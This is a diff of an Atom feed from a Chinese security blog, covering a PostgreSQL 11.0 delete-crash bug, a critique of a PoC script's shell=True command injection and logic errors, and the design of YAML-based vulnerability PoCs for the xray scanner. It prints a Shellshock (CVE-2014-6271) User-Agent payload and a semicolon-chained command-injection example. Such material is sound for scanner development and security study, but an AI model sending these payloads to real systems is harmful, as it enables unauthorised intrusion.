@@ -1,6 +1,6 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.5.1">Jekyll</generator><link href="https://strcpy.me/feed/index.xml" rel="self" type="application/atom+xml" /><link href="https://strcpy.me/" rel="alternate" type="text/html" /><updated>2020-03-25T02:47:37+00:00</updated><id>https://strcpy.me/</id><title type="html">virusdefender’s blog (＾－＾)V</title><subtitle> 学而不思则罔，思而不学则殆</subtitle><author><name>virusdefender</name></author><entry><title type="html">PostgreSQL 11.0 删除操作 Segmentation fault 解决方案</title><link href="https://strcpy.me/index.php/archives/798/" rel="alternate" type="text/html" title="PostgreSQL 11.0 删除操作 Segmentation fault 解决方案" /><published>2020-03-24T00:00:01+00:00</published><updated>2020-03-24T00:00:01+00:00</updated><id>https://strcpy.me/index.php/archives/PostgreSQL%2011.0%20%E5%88%A0%E9%99%A4%E6%93%8D%E4%BD%9C%20Segmentation%20fault%20%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88</id><content type="html" xml:base="https://strcpy.me/index.php/archives/798/">&lt;p&gt;此问题在公司内部已经被两个项目组遇到了，表现为在删除操作的时候，PostgreSQL 进程会直接崩溃，服务器日志大概如下&lt;/p&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.6.2">Jekyll</generator><link href="https://strcpy.me/feed/index.xml" rel="self" type="application/atom+xml" /><link href="https://strcpy.me/" rel="alternate" type="text/html" /><updated>2020-10-03T10:37:24+00:00</updated><id>https://strcpy.me/</id><title type="html">virusdefender’s blog (＾－＾)V</title><subtitle> 学而不思则罔，思而不学则殆</subtitle><author><name>virusdefender</name></author><entry><title type="html">PostgreSQL 11.0 删除操作 Segmentation fault 解决方案</title><link href="https://strcpy.me/index.php/archives/798/" rel="alternate" type="text/html" title="PostgreSQL 11.0 删除操作 Segmentation fault 解决方案" /><published>2020-03-24T00:00:01+00:00</published><updated>2020-03-24T00:00:01+00:00</updated><id>https://strcpy.me/index.php/archives/PostgreSQL%2011.0%20%E5%88%A0%E9%99%A4%E6%93%8D%E4%BD%9C%20Segmentation%20fault%20%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88</id><content type="html" xml:base="https://strcpy.me/index.php/archives/798/">&lt;p&gt;此问题在公司内部已经被两个项目组遇到了，表现为在删除操作的时候，PostgreSQL 进程会直接崩溃，服务器日志大概如下&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;2020-03-25 02:30:59.813 UTC [1] LOG:  server process (PID 89) was terminated by signal 11: Segmentation fault
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;2020-03-25 02:30:59.813 UTC [1] LOG:  server process (PID 89) was terminated by signal 11: Segmentation fault
 2020-03-25 02:30:59.813 UTC [1] DETAIL:  Failed process was running: DELETE FROM a;
 2020-03-25 02:30:59.815 UTC [1] LOG:  terminating any other active server processes
 2020-03-25 02:30:59.817 UTC [74] WARNING:  terminating connection because of crash of another server process
@@ -10,16 +10,14 @@
 2020-03-25 02:30:59.861 UTC [91] LOG:  database system was interrupted; last known up at 2020-03-25 02:30:49 UTC
 2020-03-25 02:31:00.032 UTC [91] LOG:  database system was not properly shut down; automatic recovery in progress
 2020-03-25 02:31:00.036 UTC [91] LOG:  redo starts at 0/1652540
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;h2 id=&quot;解决方案&quot;&gt;解决方案&lt;/h2&gt;
 
 &lt;p&gt;这是 PostgreSQL 的一个 bug，尝试运行&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;VACUUM FULL ANALYZE; 
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;VACUUM FULL ANALYZE; 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;p&gt;之后一般可以恢复正常。&lt;/p&gt;
 
@@ -29,7 +27,7 @@
 
 &lt;p&gt;使用 PostgreSQL 11.0 版本，然后执行下面的 sql&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;CREATE TABLE a (
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;CREATE TABLE a (
      id bigint
 );
 
@@ -44,18 +42,16 @@ CREATE TABLE b (
 ALTER TABLE ONLY b ADD CONSTRAINT b_a_id_fkey FOREIGN KEY (a_id) REFERENCES a(id);
 
 ALTER TABLE a ADD x BOOLEAN NOT NULL DEFAULT FALSE; 
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;p&gt;再执行 &lt;code class=&quot;highlighter-rouge&quot;&gt;DELETE FROM a;&lt;/code&gt; 的时候就可以复现问题。&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root=# DELETE FROM a;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root=# DELETE FROM a;
 server closed the connection unexpectedly
 	This probably means the server terminated abnormally
 	before or while processing the request.
 The connection to the server was lost. Attempting reset: Failed.
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;p&gt;修复的代码见 &lt;a href=&quot;https://git.postgresql.org/gitweb/?p=postgresql.git&amp;amp;a=commit&amp;amp;h=7636e5c60f&quot;&gt;https://git.postgresql.org/gitweb/?p=postgresql.git&amp;amp;a=commit&amp;amp;h=7636e5c60f&lt;/a&gt;&lt;/p&gt;
 
@@ -82,7 +78,7 @@ The connection to the server was lost. Attempting reset: Failed.
   &lt;li&gt;潜在的命令注入问题，更何况这里使用了 &lt;code class=&quot;highlighter-rouge&quot;&gt;shell=True&lt;/code&gt; 参数。这个可以借助下面的代码来理解&lt;/li&gt;
 &lt;/ul&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; &amp;gt;&amp;gt;&amp;gt; subprocess.check_output(&quot;curl http://example.com; expr 1024 + 20480000&quot;, shell=False)
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; &amp;gt;&amp;gt;&amp;gt; subprocess.check_output(&quot;curl http://example.com; expr 1024 + 20480000&quot;, shell=False)
 Traceback (most recent call last):
   ......
 FileNotFoundError: [Errno 2] No such file or directory: 'curl http://example.com; expr 1024 + 20480000': 'curl http://example.com; expr 1024 + 20480000'
@@ -90,31 +86,27 @@ FileNotFoundError: [Errno 2] No such file or directory: 'curl http://example.com
 
 &amp;gt;&amp;gt;&amp;gt; subprocess.check_output(&quot;curl http://example.com; expr 1024 + 20480000&quot;, shell=True)
 b'&lt;span class=&quot;cp&quot;&gt;&amp;lt;!doctype html&amp;gt;&lt;/span&gt;\n&lt;span class=&quot;nt&quot;&gt;&amp;lt;html&amp;gt;&lt;/span&gt;\n&lt;span class=&quot;nt&quot;&gt;&amp;lt;head&amp;gt;&lt;/span&gt;\n    .....&lt;span class=&quot;nt&quot;&gt;&amp;lt;/html&amp;gt;&lt;/span&gt;\n20481024\n'
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;h2 id=&quot;一个重大逻辑错误&quot;&gt;一个重大逻辑错误&lt;/h2&gt;
 
 &lt;p&gt;如果说上面的问题不影响 poc 的效果的话，下面这个问题是真正的错误了。&lt;/p&gt;
 
-&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;[global]&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;and&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;encrypt passwords&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;and&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;name resolve order&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;response&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;[global]&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;and&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;encrypt passwords&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;and&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;name resolve order&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;response&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
 	&lt;span class=&quot;k&quot;&gt;pass&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;p&gt;根据漏洞原理和代码写法猜测，原作者的意思是 response 中同时含有这三个字符串，但是这里的写法却错误的理解了 Python 的优先级。&lt;/p&gt;
 
 &lt;p&gt;这个代码等价于&lt;/p&gt;
 
-&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;bp&quot;&gt;True&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;and&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;True&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;and&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;name resolve order&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;name resolve order&quot;&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;bp&quot;&gt;True&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;and&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;True&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;and&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;name resolve order&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;name resolve order&quot;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;p&gt;只要 response 含有最后一个字符串就会是 &lt;code class=&quot;highlighter-rouge&quot;&gt;True&lt;/code&gt;，实际应该为&lt;/p&gt;
 
-&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;s&quot;&gt;&quot;str1&quot;&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;response&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;and&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;str2&quot;&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;response&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;s&quot;&gt;&quot;str1&quot;&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;response&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;and&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;str2&quot;&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;response&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;p&gt;这种写法。&lt;/p&gt;
 
@@ -122,12 +114,11 @@ b'&lt;span class=&quot;cp&quot;&gt;&amp;lt;!doctype html&amp;gt;&lt;/span&gt;\n&
 
 &lt;p&gt;还是在这段代码&lt;/p&gt;
 
-&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;[global]&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;and&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;encrypt passwords&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;and&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;name resolve order&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;response&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;[global]&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;and&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;encrypt passwords&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;and&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;name resolve order&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;response&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
     &lt;span class=&quot;k&quot;&gt;pass&lt;/span&gt;
 &lt;span class=&quot;k&quot;&gt;elif&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;NSIP_RESPONSE_MSG&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;response&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;decode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;utf-8&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;errors&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;ignore&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)):&lt;/span&gt;
     &lt;span class=&quot;k&quot;&gt;pass&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;p&gt;很多处没必要 bytes 转 string，直接去 bytes 匹配即可，毕竟匹配的都是英文单词，不涉及到解码的问题。&lt;/p&gt;
 
@@ -160,22 +151,21 @@ b'&lt;span class=&quot;cp&quot;&gt;&amp;lt;!doctype html&amp;gt;&lt;/span&gt;\n&
 
 &lt;p&gt;我们后续的设计就是基于 yaml 格式去写 poc，使用表达式去判断漏洞，这样可以兼顾静态和动态特性，下面是一个 demo。&lt;/p&gt;
 
-&lt;div class=&quot;language-yaml highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;s&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;poc-yaml-bash-cve-2014-6271&lt;/span&gt;
-&lt;span class=&quot;s&quot;&gt;set&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
-  &lt;span class=&quot;s&quot;&gt;r1&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;randomInt(800000000, 1000000000)&lt;/span&gt;
-  &lt;span class=&quot;s&quot;&gt;r2&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;randomInt(800000000, 1000000000)&lt;/span&gt;
-&lt;span class=&quot;s&quot;&gt;rules&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
-  &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;method&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;GET&lt;/span&gt;
-    &lt;span class=&quot;s&quot;&gt;headers&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
-      &lt;span class=&quot;s&quot;&gt;User-Agent&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;()&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;:;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;};&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;echo;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;echo;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;/bin/bash&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;-c&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'expr&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;{{r1}}&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;{{r2}}'&quot;&lt;/span&gt;
-    &lt;span class=&quot;s&quot;&gt;follow_redirects&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;false&lt;/span&gt;
-    &lt;span class=&quot;s&quot;&gt;expression&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;response.body.bcontains(bytes(string(r1 + r2)))&lt;/span&gt;
-&lt;span class=&quot;s&quot;&gt;detail&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
-  &lt;span class=&quot;s&quot;&gt;author&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;neal1991(https://github.com/neal1991)&lt;/span&gt;
-  &lt;span class=&quot;s&quot;&gt;links&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
+&lt;div class=&quot;language-yaml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;na&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;poc-yaml-bash-cve-2014-6271&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;set&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
+  &lt;span class=&quot;na&quot;&gt;r1&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;randomInt(800000000, 1000000000)&lt;/span&gt;
+  &lt;span class=&quot;na&quot;&gt;r2&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;randomInt(800000000, 1000000000)&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;rules&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
+  &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;method&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;GET&lt;/span&gt;
+    &lt;span class=&quot;na&quot;&gt;headers&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
+      &lt;span class=&quot;na&quot;&gt;User-Agent&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;()&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;:;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;};&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;echo;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;echo;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;/bin/bash&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;-c&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'expr&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;{{r1}}&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;{{r2}}'&quot;&lt;/span&gt;
+    &lt;span class=&quot;na&quot;&gt;follow_redirects&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;false&lt;/span&gt;
+    &lt;span class=&quot;na&quot;&gt;expression&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;response.body.bcontains(bytes(string(r1 + r2)))&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;detail&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
+  &lt;span class=&quot;na&quot;&gt;author&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;neal1991(https://github.com/neal1991)&lt;/span&gt;
+  &lt;span class=&quot;na&quot;&gt;links&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
     &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;https://github.com/opsxcq/exploit-CVE-2014-6271&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;p&gt;expression 字段是一个表达式，除了上面的函数，还支持正则、字符串处理等函数，map、括号嵌套等更是基本语法层面的东西，并不是死板简单的正则匹配参数。我们使用的实现是 Google 的 cel 表达式，它是带有类型检查的，有错误根本通不过检查，不会到运行时才报错。同时我们给了 &lt;code class=&quot;highlighter-rouge&quot;&gt;poclint&lt;/code&gt; 工具，类似 &lt;code class=&quot;highlighter-rouge&quot;&gt;go fmt&lt;/code&gt; 帮助你格式化 poc 的代码和检查错误。&lt;/p&gt;
 
@@ -234,67 +224,64 @@ b'&lt;span class=&quot;cp&quot;&gt;&amp;lt;!doctype html&amp;gt;&lt;/span&gt;\n&
 
 &lt;p&gt;首先去 &lt;a href=&quot;https://github.com/chaitin/xray/releases&quot;&gt;GitHub&lt;/a&gt; 下载最新的 xray 二进制文件，然后运行 &lt;code class=&quot;highlighter-rouge&quot;&gt;./xray help&lt;/code&gt; 让 xray 生成一个默认的配置文件 &lt;code class=&quot;highlighter-rouge&quot;&gt;cofig.yaml&lt;/code&gt;。我们需要在这个配置文件中配置反连平台的一些参数，默认是配置如下。&lt;/p&gt;
 
-&lt;div class=&quot;language-yml highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;s&quot;&gt;reverse&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
-  &lt;span class=&quot;s&quot;&gt;db_file_path&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;./xray.db&quot;&lt;/span&gt;
